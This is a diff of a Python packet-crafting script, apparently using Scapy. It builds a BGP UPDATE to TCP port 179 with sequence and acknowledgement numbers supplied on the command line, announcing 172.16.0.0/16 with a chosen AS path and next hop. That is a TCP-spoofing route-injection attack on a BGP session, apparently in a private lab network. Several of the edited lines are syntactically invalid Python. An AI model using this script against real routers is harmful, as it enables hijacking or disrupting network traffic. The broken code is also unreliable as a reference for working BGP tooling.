@@ -16,11 +16,15 @@ tcp = TCP(dport=179, sport=int(sys.argv[3]), seq=int(sys.argv[1]), ack=int(sys.a
 #Type 3 is notification, marker is used for authentication, max hex for no auth(32 fs)
 BGPHeader = BGPHeader(type=2, marker=0xffffffffffffffffffffffffffffffff)
 
-BGPUp = BGPUpdate(path_attr=[BGPPathAttr(type_flags=64, type_code=5, attribute=[BGPPAOrigin=0, BGPPAASPath=['1000','1050'], BGPPANextHop('192.168.4.2')])], nlri=BGPNLRI_IPv4(prefix='172.16.0.0/16'))
+Origin = 0
+Path = ['1000', '1050']
+nextHop = '192.168.4.2'
+nlriV = BGPNLRI_IPv4[(16, '172.16.0.0')]
 
-BGPUpB = BGPUpdate(path_attr=[BGPPathAttr(type_flags=64, type_code=5, attribute=BGPPALocalPref(local_pref=100), nlri=BGPNLRI_IPv4[(16, '172.16.0.0')])
+#BGPUp = BGPUpdate(path_attr=[BGPPathAttr(type_flags=64, type_code=5, attribute=[BGPPAOrigin=0, BGPPAASPath=['1000','1050'], BGPPANextHop='192.168.4.2')], nlri=BGPNLRI_IPv4(prefix='172.16.0.0/16'))
 
-nextHop = BGPPANextHop('192.168.1.1')
+BGPUpB = BGPUpdate(path_attr=[BGPPathAttr(type_flags=64, type_code=5, attribute=BGPPALocalPref(local_pref=100))], nlri=BGPNLRI_IPv4[(16, '172.16.0.0')])
+
 
 #pkt=IP(dst=dIP,src=sIP,ttl=1) / TCP(dport=dstPort,sport=srcPort) / BGPHeader / BGPNotif
 #pkt.show2()
